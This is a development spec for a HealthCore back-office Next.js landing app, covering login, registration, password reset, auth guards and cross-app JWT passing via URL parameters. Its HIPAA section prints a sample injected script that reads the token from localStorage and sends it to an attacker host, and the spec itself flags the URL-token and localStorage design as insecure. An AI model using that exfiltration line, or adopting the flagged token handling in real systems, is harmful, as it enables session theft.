# SPECS_auth_2_3.md — AUTH-02 / AUTH-03: Back Office Landing Page + Authentication Flows + Password Reset

## Overview

Build a **new Next.js app** at `uis/backoffice/landing/` that serves as the authenticated entry point to all HealthCore internal tools. This app provides login, registration, password reset, account management, and navigation to every protected app in the monorepo. It also includes the backend API endpoints for password reset (AUTH-03).

The public website (`uis/website/`) must remain entirely unaffected — no auth checks, no redirects.

---

## Reference Material

- Source tickets (used to generate this spec): [`auth2_screenshot.md`](auth2_screenshot.md) (AUTH-02), [`auth3_screenshot.md`](auth3_screenshot.md) (AUTH-03)
- AUTH-01 baseline: [`SPECS_auth_1.md`](SPECS_auth_1.md), [`IMPLEMENTATION_PLAN_auth_1.md`](IMPLEMENTATION_PLAN_auth_1.md)
- Implementation plan: [`IMPLEMENTATION_PLAN_auth_2_3.md`](IMPLEMENTATION_PLAN_auth_2_3.md)
- Agent workflow: [`AGENTS.md`](../../../AGENTS.md) — bootstrap memory-bank root files and `.agents/` rules/skills before build
- Existing API: `services/api/` (FastAPI + TinyDB in `db.json`)
- Existing auth backend: `services/api/app/domains/auth/` (register, login, me)
- Incident analyzer (style reference): `uis/incident_analyzer/`
- Backoffice functions (existing app): `uis/backoffice/backoffice_functions/`

---

## Tech Stack (match `uis/incident_analyzer/`)

- **Next.js 16.2.6** with App Router
- **React 19.2.4**
- **Tailwind CSS v4** via `@tailwindcss/postcss`
- **TypeScript 5**
- Port: **3004** (add `--port 3004` to `dev` and `start` scripts)
- No UI component libraries — Tailwind utility classes only

---

## Visual Design — Match Incident Analyzer Styling

All pages must use the same design language as `uis/incident_analyzer/`.

### Global CSS (`app/globals.css`)

Copy the exact CSS variables and base styles from `uis/incident_analyzer/app/globals.css`:

```css
@import "tailwindcss";

:root {
  --hc-brand: #0369a1;
  --hc-brand-strong: #0c4a6e;
  --hc-surface: #ffffff;
  --hc-surface-muted: #f8fafc;
  --hc-border: #cbd5e1;
  --hc-text: #0f172a;
  --hc-text-muted: #475569;
}

body {
  background: var(--hc-surface-muted);
  color: var(--hc-text);
  font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
}

:focus-visible {
  outline: 2px solid #0369a1;
  outline-offset: 2px;
}
```

### Layout (`app/layout.tsx`)

```tsx
<html lang="en" className="h-full antialiased">
  <body className="min-h-full bg-slate-50 text-slate-900">
```

### Header Component

Reuse the same gradient header pattern from `uis/incident_analyzer/components/layout/incident-header.tsx`:

```
className="rounded-2xl bg-gradient-to-r from-sky-900 to-teal-700 p-6 text-white shadow-xl md:p-8"
```

Include the `HealthcoreLogo` SVG component (copy from `uis/incident_analyzer/components/layout/healthcore-logo.tsx`) and the "HealthCore Digital" subtitle with `text-xs font-semibold uppercase tracking-[0.2em] text-sky-100`.

### Footer Component

Simple footer at the bottom of every page:

```
className="mt-auto border-t border-slate-200 bg-white px-6 py-4 text-center text-xs text-slate-500"
```

Content: `© 2026 HealthCore Digital. All rights reserved.`

---

## API Base URL

All frontend API calls must read the base URL from an environment variable:

```
NEXT_PUBLIC_API_URL=http://localhost:8000/api/v1
```

Add this to a `.env.local.example` file in the landing app root.

The existing API runs at `http://localhost:8000` and all routes are prefixed with `/api/v1`.

---

## Part 1 — Landing Page (`/`)

### Hero Section

A centered hero within the gradient header area (same styling as incident analyzer header):

- Title: **"HealthCore Back Office"**
- Subtitle: "Secure portal for HealthCore internal tools and administration."
- Two CTA buttons side by side:
  - **"Log In"** → navigates to `/login` — white bg, dark text (`bg-white text-sky-900 hover:bg-sky-50`)
  - **"Register"** → navigates to `/register` — outlined (`border border-white text-white hover:bg-white/10`)

### Navigation Links Section

Below the hero, a card grid showing links to all internal tools. Each card has:
- Icon (use simple SVG or emoji)
- Title
- Short description
- Link

Cards:

| Title | Description | URL | Notes |
|---|---|---|---|
| Incident Analyzer | Patient incident report analysis dashboard | `http://localhost:3002` | Protected |
| Supplier Directory | Manage and search healthcare suppliers | `http://localhost:3003` | Protected |
| Talent Pipeline Tracker | Track recruitment and hiring pipeline | `http://localhost:3000` | Protected (uses external API) |
| Back Office Functions | Milestone 2 utility function test dashboard | `http://localhost:3001` | Protected |
| Public Website | HealthCore public-facing website | `http://localhost:3005` | Not protected — opens in same tab |

**Port assignments:**
- The talent tracker (`apps/talent-pipeline-tracker/`) defaults to port 3000. Keep it on 3000.
- The website (`uis/website/`) also defaults to port 3000 since its `dev` script has no `--port` flag. **Update** `uis/website/package.json` to use `--port 3005` so it doesn't conflict with the talent tracker.

Each card should open protected apps in a **new tab** (`target="_blank"`). The public website link should open in the **same tab**.

Cards for protected apps should show a small lock icon to indicate they require authentication.

### Link to Public Website

Include a clearly labeled, non-protected link to the public website. This link should **not** append any token and should be visually distinct from the protected cards (no lock icon, different accent color or label like "Public").

---

## Part 2 — Authentication Views

### 2a. Login Page (`/login`)

Route: `app/(public)/login/page.tsx`

**Form fields:**
- Email — `<input type="email">`, required
- Password — `<input type="password">`, required

**Behavior:**
- On submit: `POST /api/v1/auth/login` with `{ "email": "<email>", "password": "<password>" }`
- On success (200): store the `access_token` from the response in `localStorage` under key `"token"`, then redirect to `/`
- On failure (401): show inline error message "Invalid email or password." below the form
- On failure (other): show "Something went wrong. Please try again."

**Additional elements:**
- "Forgot your password?" link below the password field → navigates to `/forgot-password`
- "Don't have an account? Register" link below the submit button → navigates to `/register`
- If URL contains `?reset=success`, show a green banner at the top: "Your password has been reset. Please log in with your new password."

**Styling:** Card centered on page with `max-w-md mx-auto`, white background, rounded-xl, shadow, padding. Form inputs use Tailwind: `w-full rounded-lg border border-slate-300 px-3 py-2 text-sm focus:border-sky-500 focus:ring-1 focus:ring-sky-500`. Submit button uses brand gradient: `bg-gradient-to-r from-sky-900 to-teal-700 text-white rounded-lg px-4 py-2 font-semibold`.

### 2b. Registration Page (`/register`)

Route: `app/(public)/register/page.tsx`

**Form fields:**
- Name — `<input type="text">`, required
- Email — `<input type="email">`, required
- Password — `<input type="password">`, required, min 8 characters
- Confirm Password — `<input type="password">`, required, must match password

**Client-side validation (before API call):**
- All fields required
- Password must be at least 8 characters
- Password and Confirm Password must match
- Show field-level error messages below each invalid field in red text

**Behavior:**
- On submit: `POST /api/v1/auth/register` with `{ "name": "<name>", "email": "<email>", "password": "<password>" }`
- On success (201): store the `access_token` in `localStorage` under key `"token"`, redirect to `/`
- On failure (422 — "Email already registered"): show error below email field
- On failure (422 — validation errors): show field-level errors

**Additional elements:**
- "Already have an account? Log in" link → navigates to `/login`

**Styling:** Same card pattern as login page.

---

## Part 3 — Password Reset Flow (AUTH-03)

### 3a. Backend — New API Endpoints

These endpoints are added to the existing FastAPI service at `services/api/`.

#### `POST /api/v1/auth/forgot-password`

Add to: `services/api/app/domains/auth/router.py`

**Request body:** `{ "email": "<email>" }`

**Behavior:**
1. Look up the user by email in the users store (`store.get_by_email`)
2. If found: generate a short-lived reset token — a JWT with `{"purpose": "reset", "sub": str(user_id), "exp": 30 minutes from now}` signed with the existing `settings.secret_key`
3. Send an email containing the reset link: `{FRONTEND_URL}/reset-password?token={token}`
4. **Always return `200 OK`** with `{ "message": "If that address is registered, you will receive a reset link shortly." }` — regardless of whether the email was found (prevents user enumeration)
5. If `email_api_key` is empty/not configured, log the reset link to stdout instead of sending email (allows development without an email service configured)

**Email sending:**
- Integrate **one** transactional email service: either **Resend** (`resend` pip package) or **SendGrid** (`sendgrid` pip package) — implementer's choice
- Add the chosen SDK to `pyproject.toml` dependencies
- Store the API key in `.env` as `EMAIL_API_KEY`
- Add to `.example.env`: `EMAIL_API_KEY=your-key-here` and `FRONTEND_URL=http://localhost:3004`
- Add to `Settings` in `services/api/app/core/config.py`: `email_api_key: str = ""` and `frontend_url: str = "http://localhost:3004"`
- The email should be plain text with the reset link. Subject: "HealthCore — Password Reset"
- From address: use the service's default/onboarding sender (e.g. `onboarding@resend.dev` for Resend)

**New schemas** (add to `services/api/app/domains/auth/schemas.py`):

```python
class ForgotPasswordRequest(BaseModel):
    email: EmailStr

class ForgotPasswordResponse(BaseModel):
    message: str

class ResetPasswordRequest(BaseModel):
    token: str
    new_password: str

    @field_validator("new_password")
    @classmethod
    def password_min_length(cls, v: str) -> str:
        return _validate_password_min_length(v)

class ResetPasswordResponse(BaseModel):
    message: str
```

#### `POST /api/v1/auth/reset-password`

Add to: `services/api/app/domains/auth/router.py`

**Request body:** `{ "token": "<reset_token>", "new_password": "<new_password>" }`

**Behavior:**
1. Check if the token exists in the `"used_reset_tokens"` TinyDB table. If so, return `400` with `{ "detail": "Invalid or expired reset token." }`
2. Decode the JWT token using `settings.secret_key`. Verify that `"purpose" == "reset"` and that it hasn't expired. On failure, return `400` with `{ "detail": "Invalid or expired reset token." }`
3. Extract `user_id` from `"sub"`
4. Hash the new password using `hash_password()` from `app.domains.auth.password`
5. Update the user record via `store.update_user(user_id, {"hashed_password": hashed})`
6. Insert the token string into the `"used_reset_tokens"` TinyDB table to prevent reuse
7. Return `200 OK` with `{ "message": "Password has been reset successfully." }`

**Token invalidation store:** Create a simple helper in `services/api/app/domains/auth/service.py` (or a new file) that reads/writes a `"used_reset_tokens"` table in TinyDB:
- `is_token_used(token: str) -> bool`
- `mark_token_used(token: str) -> None`

### 3b. Backend — Add `name` Field to User Model

The existing `UserResponse` has no `name` field. Add it throughout:

1. **Schemas** (`services/api/app/domains/auth/schemas.py`):
   - Add `name: str = ""` to `UserCreate`
   - Add `name: str | None = None` to `UserUpdate`
   - Add `name: str` to `UserResponse`
   - Add `name: str` to `User`

2. **Auth service** (`services/api/app/domains/auth/service.py`): Add `"name": body.name` to the `doc` dict in `register()`

3. **User service** (`services/api/app/domains/users/service.py`):
   - Add `"name": body.name` to the `doc` dict in `create_user()`
   - In `to_user_response()`, handle missing `name` for existing users: `payload.setdefault("name", "")`

4. **Store**: No changes needed — TinyDB is schemaless

### 3c. Frontend — Forgot Password Page (`/forgot-password`)

Route: `app/(public)/forgot-password/page.tsx`

**Form fields:**
- Email — `<input type="email">`, required

**Behavior:**
- On submit: `POST /api/v1/auth/forgot-password` with `{ "email": "<email>" }`
- On any response (including success): show confirmation message "If that address is registered, you'll receive a link shortly."
- Disable the submit button after first submission to prevent duplicate requests
- Do **not** reveal whether the email exists — the UI behavior must be identical regardless

**Additional elements:**
- "Back to login" link → navigates to `/login`

**Styling:** Same centered card pattern as login/register.

### 3d. Frontend — Reset Password Page (`/reset-password`)

Route: `app/(public)/reset-password/page.tsx`

**Form fields:**
- New Password — `<input type="password">`, required, min 8 characters
- Confirm New Password — `<input type="password">`, required, must match

**Behavior:**
- Read `token` from the URL query string (`?token=<value>`) using `useSearchParams()`
- If no token in URL: show error "Invalid reset link." with a link to `/forgot-password`
- On submit: `POST /api/v1/auth/reset-password` with `{ "token": "<token>", "new_password": "<password>" }`
- On success: redirect to `/login?reset=success`
- On failure (400 — expired/invalid token): show error "This reset link has expired or is invalid." with a link back to `/forgot-password`

**Client-side validation:**
- New password min 8 characters
- Passwords must match

**Styling:** Same centered card pattern.

---

## Part 4 — Account Management Views

### 4a. Profile Page (`/account/profile`)

Route: `app/(protected)/account/profile/page.tsx`

**Behavior:**
- On mount: call `GET /api/v1/auth/me` with `Authorization: Bearer <token>` to fetch current user data
- Display: name, email (read-only), account creation date
- Editable field: **Name** — inline edit with a "Save" button
- On save: `PUT /api/v1/users/{id}` with `{ "name": "<new_name>" }` and `Authorization: Bearer <token>` header
- On success: show inline "Saved" confirmation message
- On 401: clear token, redirect to `/login` (handled by `apiFetch` automatically)

**Additional elements:**
- "Change Password" link → navigates to `/account/change-password`
- "Log Out" button → calls `localStorage.removeItem("token")`, redirects to `/login`

### 4b. Change Password Page (`/account/change-password`)

Route: `app/(protected)/account/change-password/page.tsx`

**Form fields:**
- Current Password — `<input type="password">`, required
- New Password — `<input type="password">`, required, min 8 characters
- Confirm New Password — `<input type="password">`, required, must match new password

**Client-side validation:**
- New password min 8 characters
- New password and confirmation must match
- New password must differ from current password

**Behavior:**
- On submit: first verify the current password by calling `POST /api/v1/auth/login` with the user's email and current password
  - If login fails (401): show "Current password is incorrect."
  - If login succeeds: call `PUT /api/v1/users/{id}` with `{ "password": "<new_password>" }` and the `Authorization: Bearer <token>` header
- On success: show success message, redirect to `/account/profile`
- On 401 from the PUT: clear token, redirect to `/login`

---

## Part 5 — Token Lifecycle & API Utility

### Shared API Utility (`lib/api.ts`)

Create a wrapper around `fetch` that all pages use for protected API calls:

```typescript
const API_URL = process.env.NEXT_PUBLIC_API_URL;

export async function apiFetch(path: string, options: RequestInit = {}): Promise<Response> {
  const token = localStorage.getItem("token");
  const headers = new Headers(options.headers);
  if (token) {
    headers.set("Authorization", `Bearer ${token}`);
  }
  headers.set("Content-Type", "application/json");

  const response = await fetch(`${API_URL}${path}`, { ...options, headers });

  if (response.status === 401) {
    localStorage.removeItem("token");
    window.location.href = "/login";
    throw new Error("Unauthorized");
  }

  return response;
}
```

All API calls from the landing app (login, register, forgot-password, reset-password, profile, change-password) **must** use this utility.

### Token Rules

| Event | Action |
|---|---|
| Login success | `localStorage.setItem("token", response.access_token)` |
| Register success | `localStorage.setItem("token", response.access_token)` |
| Logout | `localStorage.removeItem("token")` → redirect to `/login` |
| Any API call returns 401 | `localStorage.removeItem("token")` → redirect to `/login` |

---

## Part 6 — Route Protection

### Architecture: Shared Auth Guard Pattern

The auth guard must be implementable across all protected Next.js apps in the monorepo — both existing apps and future ones. Since these are separate Next.js apps (different `package.json`, different ports), each app gets its own copy of the guard component, but the pattern is identical.

**Do NOT use Next.js middleware** for this — `localStorage` is not available server-side. Use a **client-side layout guard** instead.

### Cross-App Token Sharing

Since each app runs on a different port (3000–3005), `localStorage` is **not shared** between them (different origins under the same-origin policy). Solution: **URL token passing**.

When a logged-in user clicks a navigation card on the landing page to open a protected app, the link appends the token as a query parameter:
```
http://localhost:3002?token=<jwt>
```

The auth guard on the destination app checks for `?token=` in the URL first. If present, it stores the token in that app's `localStorage` and strips the param from the URL. Then it proceeds with the normal `localStorage` check.

### Auth Guard Component

Create this component in each protected app at `components/auth/auth-guard.tsx`:

```typescript
"use client";

import { useEffect, useState } from "react";

const LOGIN_URL = "http://localhost:3004/login";

export function AuthGuard({ children }: { children: React.ReactNode }) {
  const [isAuthed, setIsAuthed] = useState(false);

  useEffect(() => {
    // Check for token passed via URL (cross-app navigation)
    const params = new URLSearchParams(window.location.search);
    const urlToken = params.get("token");
    if (urlToken) {
      localStorage.setItem("token", urlToken);
      params.delete("token");
      const cleanUrl = window.location.pathname + (params.toString() ? `?${params.toString()}` : "");
      window.history.replaceState({}, "", cleanUrl);
    }

    const token = localStorage.getItem("token");
    if (!token) {
      window.location.href = LOGIN_URL;
      return;
    }
    setIsAuthed(true);
  }, []);

  if (!isAuthed) {
    return (
      <div className="flex min-h-screen items-center justify-center">
        <p className="text-sm text-slate-500">Checking authentication…</p>
      </div>
    );
  }

  return <>{children}</>;
}
```

### Where to Add the Auth Guard

Wrap the root layout's `{children}` in `<AuthGuard>` in each protected app:

| App | Layout file to modify | Port |
|---|---|---|
| Backoffice Functions | `uis/backoffice/backoffice_functions/app/layout.tsx` | 3001 |
| Incident Analyzer | `uis/incident_analyzer/app/layout.tsx` | 3002 |
| Supplier Directory | `uis/supplier_directory/app/layout.tsx` | 3003 |
| Talent Pipeline Tracker | `apps/talent-pipeline-tracker/app/layout.tsx` | 3000 |

**For the landing app** (`uis/backoffice/landing/`): Only protect the `/account/*` routes. Use route groups:

```
app/
  (public)/
    layout.tsx         ← no auth guard
    page.tsx           ← landing page
    login/page.tsx
    register/page.tsx
    forgot-password/page.tsx
    reset-password/page.tsx
  (protected)/
    layout.tsx         ← wraps children in <AuthGuard>
    account/
      profile/page.tsx
      change-password/page.tsx
  layout.tsx           ← root layout (header + footer)
  globals.css
```

### Navigation Cards — Token Passing

When the user is logged in, the navigation cards on the landing page must append `?token=<token>` to each protected app URL:

```typescript
const token = localStorage.getItem("token");
const href = token ? `${app.url}?token=${token}` : app.url;
```

The public website link must **never** append a token.

### Apps NOT to Protect

- `uis/website/` — the public website. **Do not add any auth guard, token check, or redirect to this app.** It must remain fully public and unchanged.

### Future-Proofing (Short Term)

Any new Next.js app added to the monorepo that needs protection simply:
1. Copies `components/auth/auth-guard.tsx` into the app
2. Wraps `{children}` in its root layout with `<AuthGuard>`
3. Adds a navigation card on the landing page
4. Adds its port to `CORS_ORIGINS` in the API config
5. No other configuration needed — the guard reads `localStorage`, handles URL token injection, and redirects to the central login at port 3004

### Future Architecture: Route Consolidation (Not for This Milestone)

The current multi-app architecture runs each internal tool as a separate Next.js project on its own port (3000–3004). This works but introduces complexity:
- Cross-port `localStorage` isolation requires URL token passing
- Each app needs its own copy of the auth guard
- CORS must be updated for every new port
- Running the full platform means starting 5+ dev servers

**Recommended future migration:** Consolidate all protected internal apps into the backoffice landing app as route groups:

```
uis/backoffice/landing/app/
  (public)/          ← login, register, reset (unchanged)
  (protected)/
    account/         ← profile, change-password (unchanged)
    incident-analyzer/   ← moved from uis/incident_analyzer/
    supplier-directory/  ← moved from uis/supplier_directory/
    backoffice-functions/ ← moved from uis/backoffice/backoffice_functions/
    talent-tracker/      ← moved from apps/talent-pipeline-tracker/
```

**Benefits of consolidation:**
- Single port, single `localStorage`, single auth guard — no URL token passing needed
- One `npm run dev` starts everything
- Shared layout, shared components, shared `lib/api.ts`
- Simpler CORS config (one origin instead of five)
- Route-level code splitting still keeps bundle sizes small

**Migration approach when ready:**
1. Move each app's `components/`, `hooks/`, `lib/` into the landing app under a domain folder (e.g. `components/incident-analyzer/`)
2. Move each app's `app/page.tsx` into the appropriate route group under `(protected)/`
3. Update internal imports to use the new paths
4. Remove the standalone app directories and their `package.json` files
5. Remove the per-app auth guards (the single `(protected)/layout.tsx` guard covers everything)
6. Remove extra ports from CORS config

**Do not implement this now.** The current multi-port approach is correct for this milestone and avoids risky refactoring of working apps. This section documents the path forward for when the team is ready to simplify.

---

## Part 7 — Backend: CORS and Config Updates

### CORS Origins

The API's CORS config at `services/api/app/core/config.py` reads `cors_origins` from `.env`. The current default only includes ports 3002 and 3003.

**Update** the default in `config.py` and `.example.env` to include all app ports:

```
CORS_ORIGINS=http://localhost:3000,http://localhost:3001,http://localhost:3002,http://localhost:3003,http://localhost:3004,http://localhost:3005
```

### Config Additions

Add these fields to `Settings` in `services/api/app/core/config.py`:

```python
email_api_key: str = ""
frontend_url: str = "http://localhost:3004"
```

### `.example.env` Final State

```env
SECRET_KEY=change-me-before-production
JWT_EXPIRE_MINUTES=30
CORS_ORIGINS=http://localhost:3000,http://localhost:3001,http://localhost:3002,http://localhost:3003,http://localhost:3004,http://localhost:3005
EMAIL_API_KEY=your-key-here
FRONTEND_URL=http://localhost:3004
```

---

## Part 8 — Backoffice Landing Page Conditional UI

When a user is already logged in (token exists in `localStorage` and a call to `GET /api/v1/auth/me` succeeds):

- Replace the "Log In" / "Register" buttons in the hero with:
  - **"My Profile"** → navigates to `/account/profile`
  - **"Log Out"** → clears token from `localStorage`, reloads page
- Show the user's name in the header area: "Welcome, {name}"
- The navigation cards still appear with token-appended links

When not logged in: show the default hero with Log In and Register buttons. Navigation cards still appear but without token in URLs (clicking them will trigger the auth guard redirect on the destination app).

---

## Part 9 — Website Port Fix

Update `uis/website/package.json` to avoid port conflict with the talent tracker:

```json
"scripts": {
  "dev": "next dev --port 3005",
  ...
}
```

This is the only change to the website app. **No auth guard, no token logic, no imports.**

---

## File Structure — `uis/backoffice/landing/`

```
landing/
├── .env.local.example
├── .gitignore                        ← copy from incident_analyzer
├── app/
│   ├── globals.css
│   ├── layout.tsx                    ← root layout (header + footer)
│   ├── (public)/
│   │   ├── layout.tsx                ← passthrough layout, no guard
│   │   ├── page.tsx                  ← landing/hero page with nav cards
│   │   ├── login/
│   │   │   └── page.tsx
│   │   ├── register/
│   │   │   └── page.tsx
│   │   ├── forgot-password/
│   │   │   └── page.tsx
│   │   └── reset-password/
│   │       └── page.tsx
│   └── (protected)/
│       ├── layout.tsx                ← wraps children in <AuthGuard>
│       └── account/
│           ├── profile/
│           │   └── page.tsx
│           └── change-password/
│               └── page.tsx
├── components/
│   ├── auth/
│   │   └── auth-guard.tsx
│   └── layout/
│       ├── healthcore-logo.tsx       ← copy from incident_analyzer
│       ├── landing-header.tsx
│       └── landing-footer.tsx
├── lib/
│   └── api.ts                        ← apiFetch wrapper
├── eslint.config.mjs                 ← copy from incident_analyzer
├── next.config.ts                    ← copy from incident_analyzer
├── package.json
├── postcss.config.mjs                ← copy from incident_analyzer
└── tsconfig.json                     ← copy from incident_analyzer
```

---

## Order of Implementation

Execute in this exact order. Each step should be working and testable before moving to the next.

> **IMPORTANT — Stop after every step.** After completing each step, **stop and wait for the user to manually test** before proceeding to the next step. Do not continue to the next step until the user explicitly confirms the current step is working. Present the user with:
> 1. A summary of what was implemented in the step
> 2. Clear instructions on how to test it (which commands to run, which URLs to visit, what behavior to expect)
> 3. A prompt asking "Ready to proceed to Step N+1?"
>
> This ensures bugs are caught early and not compounded across steps.

### Step 1 — Scaffold the Landing App
- Create `uis/backoffice/landing/` with `package.json` (port 3004), `tsconfig.json`, `next.config.ts`, `postcss.config.mjs`, `eslint.config.mjs`, `.gitignore`, `.env.local.example`
- Copy `globals.css` from incident analyzer
- Create `HealthcoreLogo`, `landing-header.tsx`, `landing-footer.tsx` components
- Create root `app/layout.tsx` and a minimal `app/(public)/page.tsx` with the hero section
- Run `npm install && npm run dev` — verify the landing page renders on port 3004

### Step 2 — Backend: Add `name` Field to User Model
- Update schemas: add `name` to `UserCreate`, `UserUpdate`, `UserResponse`, `User`
- Update `register()` in auth service to store name
- Update `create_user()` and `to_user_response()` in users service (handle missing name for existing users)
- Update CORS origins in config and `.example.env`
- Run existing tests to verify nothing breaks

### Step 3 — Login Page
- Create `app/(public)/login/page.tsx`
- Create `lib/api.ts` with the `apiFetch` wrapper
- Implement form, validation, API call, token storage, redirect to `/`
- Add "Forgot your password?" link and "Register" link
- Add `?reset=success` banner support
- Test: register a user via curl, then log in via the UI

### Step 4 — Registration Page
- Create `app/(public)/register/page.tsx`
- Implement form with all four fields (name, email, password, confirm password)
- Client-side validation (password length, password match, all required)
- API call, token storage, redirect
- Test: register a new user via the UI, verify redirect to `/`

### Step 5 — Auth Guard + Route Protection on Landing App
- Create `components/auth/auth-guard.tsx` with URL token parameter support
- Create `app/(protected)/layout.tsx` wrapping children in `<AuthGuard>`
- Create `app/(public)/layout.tsx` as a passthrough
- Create placeholder account pages
- Test: access `/account/profile` without a token — should redirect to `/login`

### Step 6 — Profile and Change Password Pages
- Build `app/(protected)/account/profile/page.tsx` — fetch user via `/auth/me`, display info, edit name
- Build `app/(protected)/account/change-password/page.tsx` — verify current password via login endpoint, then update
- Add logout button to profile page
- Test: log in, navigate to profile, edit name, change password, log out

### Step 7 — Backend: Password Reset Endpoints (AUTH-03)
- Add `ForgotPasswordRequest`, `ResetPasswordRequest`, and response schemas to `schemas.py`
- Add `email_api_key` and `frontend_url` to `Settings` in `config.py`
- Add email SDK dependency to `pyproject.toml` (Resend or SendGrid — implementer's choice)
- Create email sending utility in auth service (with stdout fallback when no API key configured)
- Add `POST /auth/forgot-password` endpoint to `router.py`
- Add `POST /auth/reset-password` endpoint with used-token tracking via `"used_reset_tokens"` TinyDB table
- Update `.example.env` with `EMAIL_API_KEY` and `FRONTEND_URL`
- Test: call forgot-password via curl, check for email/stdout output, call reset-password with the token

### Step 8 — Frontend: Password Reset Pages
- Create `app/(public)/forgot-password/page.tsx` — email form, disable after submit, confirmation message
- Create `app/(public)/reset-password/page.tsx` — read token from URL, password + confirm form, submit to API
- Add "Forgot your password?" link to login page (if not already done in Step 3)
- Test: full flow — forgot password → get token (from email or stdout) → open reset link → set new password → verify redirect to login with success banner

### Step 9 — Navigation Cards + Conditional Landing UI
- Add the navigation card grid to `app/(public)/page.tsx` with links to all 5 apps
- Implement conditional hero UI (logged-in shows "Welcome, {name}" + Profile/Logout; logged-out shows Login/Register)
- Protected app links append `?token=<jwt>` when user is logged in
- Public website link opens in same tab, no token
- Test: log in, verify cards show lock icons for protected apps, click a card and verify token passes through

### Step 10 — Auth Guards on All Protected Apps
- Copy `components/auth/auth-guard.tsx` into each protected app:
  - `uis/backoffice/backoffice_functions/components/auth/auth-guard.tsx`
  - `uis/incident_analyzer/components/auth/auth-guard.tsx`
  - `uis/supplier_directory/components/auth/auth-guard.tsx`
  - `apps/talent-pipeline-tracker/components/auth/auth-guard.tsx`
- Wrap `{children}` in each app's `app/layout.tsx` with `<AuthGuard>` (make the layout a client component or create a client wrapper)
- **Do NOT touch `uis/website/` in any way**
- Test per app: access directly without a token → redirects to login; access via landing page card with token → loads normally

### Step 11 — Website Port Fix
- Update `uis/website/package.json`: change `"dev": "next dev"` to `"dev": "next dev --port 3005"`
- Verify the website still works on port 3005 with zero auth-related changes

### Step 12 — Final Integration Test (current milestone ends here)

---

## HIPAA Implications: JWT + localStorage Token Storage

> **This section is informational.** The current implementation uses JWT tokens stored in `localStorage` as required by the assignment spec. This section documents the security risks, the relevant HIPAA regulations, and the recommended production architecture for any future deployment handling Protected Health Information (PHI).

### What This Implementation Does

- JWT access tokens are stored in `localStorage` after login
- Tokens are attached to every API call via the `Authorization: Bearer` header
- Tokens are passed between apps via URL query parameters (`?token=<jwt>`)

### Why This Is Insufficient for HIPAA Compliance

#### 1. localStorage Is Vulnerable to XSS

`localStorage` is readable by **any JavaScript running on the page**. A single Cross-Site Scripting (XSS) vulnerability — in your code, a dependency, or an injected script — allows an attacker to:

```javascript
// Any injected script can do this
const token = localStorage.getItem("token");
fetch("https://attacker.com/steal", { body: token });
```

The stolen token grants full API access to PHI until it expires. There is no way to revoke it server-side because JWT tokens are stateless.

**HIPAA relevance:** §164.312(a)(1) requires access controls to protect ePHI. A storage mechanism vulnerable to a well-documented, common attack vector (XSS is OWASP Top 10 #3) does not meet the "reasonable safeguards" standard.

#### 2. JWT Tokens Cannot Be Revoked

JWT tokens are self-contained — the server has no record of issued tokens. If a token is stolen or a user's session needs to be terminated:

- The token remains valid until its `exp` claim passes
- There is no server-side "kill switch" to invalidate it immediately
- Even changing the user's password does not invalidate existing tokens

**HIPAA relevance:** §164.312(a)(2)(iii) requires automatic logoff capabilities. §164.312(d) requires person authentication that can be terminated. A token that cannot be revoked fails both requirements.

#### 3. JWT Payloads Are Readable (Not Encrypted)

JWT tokens are base64-encoded, not encrypted. Anyone who holds the token can decode the payload and read its contents. If PHI (names, email, roles with clinical context) leaks into the JWT payload, it is exposed to any party that intercepts the token.

**HIPAA relevance:** §164.312(e)(1) requires transmission security. While HTTPS protects in-transit, a JWT payload stored in `localStorage` or browser DevTools is at rest and readable.

#### 4. URL Token Passing Leaks Credentials

The cross-app token passing via `?token=<jwt>` in the URL exposes the token in:

- Browser history
- Server access logs
- Referrer headers sent to third-party resources
- Shared screenshots or screen recordings

**HIPAA relevance:** §164.312(b) requires audit controls. Tokens leaking through uncontrolled channels makes it impossible to maintain a reliable audit trail of who accessed what.

### HIPAA Security Rule Requirements That Apply

| Regulation | Requirement | Current Gap |
|---|---|---|
| §164.312(a)(1) | Access controls for ePHI | `localStorage` is accessible to any JS on the page |
| §164.312(a)(2)(iii) | Automatic logoff | JWT cannot be revoked before expiry |
| §164.312(b) | Audit controls | No server-side session record; URL token leaks to logs |
| §164.312(d) | Person authentication | Stolen token = stolen identity with no kill switch |
| §164.312(e)(1) | Transmission security | JWT payload is readable; URL params expose tokens |

### Recommended Production Architecture

#### Token Storage: HttpOnly Cookies

Replace `localStorage` with `HttpOnly` cookies set by the server:

```
Set-Cookie: access_token=<jwt>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=900
```

| Cookie Flag | Purpose |
|---|---|
| `HttpOnly` | JavaScript cannot read or modify the cookie — immune to XSS token theft |
| `Secure` | Cookie is only sent over HTTPS — never in plaintext |
| `SameSite=Strict` | Cookie is not sent on cross-origin requests — blocks CSRF |
| `Path=/` | Scoped to the application path |
| `Max-Age=900` | Short-lived (15 min) — limits breach window |

**Impact on current code:**
- The `apiFetch` wrapper no longer needs to read `localStorage` or set the `Authorization` header — the browser sends the cookie automatically
- Login/register endpoints set the cookie via `Set-Cookie` response header instead of returning `access_token` in the JSON body
- The auth guard checks authentication by calling a lightweight `/auth/me` endpoint instead of reading `localStorage`

#### Token Architecture: Short-Lived Access + Refresh Token Rotation

| Token | Storage | TTL | Purpose |
|---|---|---|---|
| Access token | In-memory JS variable (not `localStorage`) **or** `HttpOnly` cookie | 15 minutes | Attached to every API call |
| Refresh token | `HttpOnly` cookie with `Path=/auth/refresh` | 1–8 hours | Used only to obtain new access tokens |

**Refresh flow:**
1. Access token expires → API returns 401
2. Frontend calls `POST /auth/refresh` (refresh token sent automatically via cookie)
3. Server validates the refresh token, issues a **new** access token **and** a new refresh token (rotation)
4. Old refresh token is invalidated — if an attacker replays it, the server detects reuse and revokes all sessions for that user

**Refresh token rotation** is critical: if a refresh token is stolen, the attacker and the legitimate user will both try to use it. The first reuse attempt alerts the server to a compromise.

#### Session Management: Server-Side Sessions with Opaque Tokens

For maximum HIPAA compliance, replace JWT entirely with server-side opaque tokens:

1. On login, generate a random token (`secrets.token_urlsafe(32)`) and store it in a `sessions` table with `user_id`, `created_at`, `expires_at`, `last_used_at`
2. Every API request validates the token by looking it up in the database
3. On logout or password change, delete the session row — the token is immediately dead
4. On each valid request, update `last_used_at` — if `last_used_at` exceeds an idle timeout (10–15 min for PHI apps), reject the request

**Benefits over JWT:**
- **Instant revocation** — delete the row, the token is dead
- **Audit trail** — every session is a DB record with timestamps and user ID
- **Idle timeout** — enforced server-side, not client-side
- **No sensitive data in the token** — the token is a random string, not a decodable payload

